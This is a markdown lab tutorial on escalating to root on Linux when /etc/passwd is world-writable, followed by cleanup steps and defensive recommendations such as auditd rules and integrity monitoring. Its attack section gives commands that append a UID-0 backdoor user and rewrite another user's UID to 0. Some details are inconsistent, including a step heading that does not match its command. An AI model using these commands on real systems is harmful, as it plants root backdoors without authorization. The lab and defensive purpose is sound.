## 🔒 Use Case: Insecure /etc/passwd Permissions
### Assumed Misconfiguration:
* /etc/passwd has write permissions granted to a non-root user or group: e.g., mode 0666 or 0646.
* The file is owned by root but is world-writable or group-writable.
* PAM and shadow passwords are enabled (/etc/shadow exists and holds actual hashes).
___
## 🧪 Attack Scenario (Pre-Hardening Lab Test)
### 🎯 Objective:
Achieve unauthorized local privilege escalation or account backdooring by modifying /etc/passwd.
### 🔧 Lab Setup:
1. Create a test VM (e.g., Ubuntu/Debian-based) — never test this on production.
1. Temporarily set:
```bash
sudo chmod 666 /etc/passwd
```
> Simulates a file improperly left world-writable by a script or misconfiguration.
3. Confirm with:
``` bash
ls -l /etc/passwd
```
Expected output
```bash
-rw-rw-rw- 1 root root  <size> <timestamp> /etc/passwd
```
___
### 👨‍💻 Malicious Hacker Steps:
#### ✅ 1. Create a New Root-Privileged User
Append a new line to /etc/passwd:
``` bash
echo 'eviluser:x:0:0:root:/root:/bin/bash' >> /etc/passwd
```
* x: Placeholder because /etc/shadow is used for password storage.
* 0:0: UID and GID = 0 (root).
* This essentially creates a clone of root with a different name.
> Impact: Any user can now switch to root using the eviluser credentials, especially if they manipulate /etc/shadow too (not required for demonstration).
#### ✅ 2. Set Password for the Fake User
Set the shell of an existing non-root user to bash and UID to 0 in /etc/passwd, like:
``` bash
sed -i 's/^bob:[^:]*:[0-9]*:[0-9]*/bob:x:0:0/' /etc/passwd
```
* Changes UID:GID of user bob to root.
### 🔁 Verification (Post-Exploit):
``` bash
su eviluser
# or
su bob
```
Run
```bash
id
```
Expected output
``` bash
uid=0(root) gid=0(root) groups=0(root)
```
You've successfully escalated privileges by modifying a critical system file.
___
## Cleanup
* Restore correct file permissions:
```bash
sudo chmod 644 /etc/passwd
sudo chown root:root /etc/passwd
```
* Remove injected entries:
``` bash
sudo nano /etc/passwd
```
* Verify no account with UID 0 except root remains:
``` bash
awk -F: '($3 == 0) {print}' /etc/passwd
```
## 🔐 Defensive Recommendations:
* ### Permission Check Automation:
  * Periodic audit via cron or agent:
    ``` bash
    find /etc/passwd ! -perm 644 -exec chmod 644 {} \;
    ```
* ### Use File Integrity Monitoring (AIDE, OSSEC, Tripwire).
* ### Enable Mandatory Access Control (MAC):
  * AppArmor or SELinux to protect critical files from being altered by non-privileged processes.
* ### AuditD Rule Example:
  ``` bash
  -w /etc/passwd -p wa -k passwd_changes
  ```
  Track all modifications to /etc/passwd.
___
## 🧠 Final Thoughts:
This test highlights how a small deviation from default file permissions on a sensitive Linux system file like /etc/passwd can be immediately catastrophic. Even if /etc/shadow is secure, simply changing a UID to 0 provides a backdoor to full system access.






